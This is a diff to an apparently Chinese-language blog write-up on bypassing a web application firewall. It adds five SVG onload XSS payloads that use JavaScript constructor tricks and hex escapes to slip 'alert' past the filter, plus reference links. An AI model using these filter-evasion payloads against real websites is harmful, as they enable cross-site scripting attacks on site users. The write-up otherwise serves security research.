@@ -248,10 +248,22 @@ waf拦截
  
 总结起来就是`Set.constructor` `Map.constructor` `clear.constructor` `Array.constructor` `WeakSet.constructor` (注意区分大小写的)
 
+```
+<svg/onload=Set.constructor`al\x65rt\x28/xss/\x29```>
+<svg/onload=Map.constructor`al\x65rt\x28/xss/\x29```>
+<svg/onload=clear.constructor`al\x65rt\x28/xss/\x29```>
+<svg/onload=Array.constructor`al\x65rt\x28/xss/\x29```>
+<svg/onload=WeakSet.constructor`al\x65rt\x28/xss/\x29```>
+```
+
 引用外部...
 
 ![36](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ylf0t8nsj306o06ojrl.jpg)
 
+感兴趣的同学可以关注：[Github项目](https://github.com/S9MF/Xss_Test/edit/master/waf/YunSuo.md)
+
 ## 参考致谢
-- - -
+
+[vulnerability-lab.com](http://www.vulnerability-lab.com/resources/documents/531.txt)
 [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
+
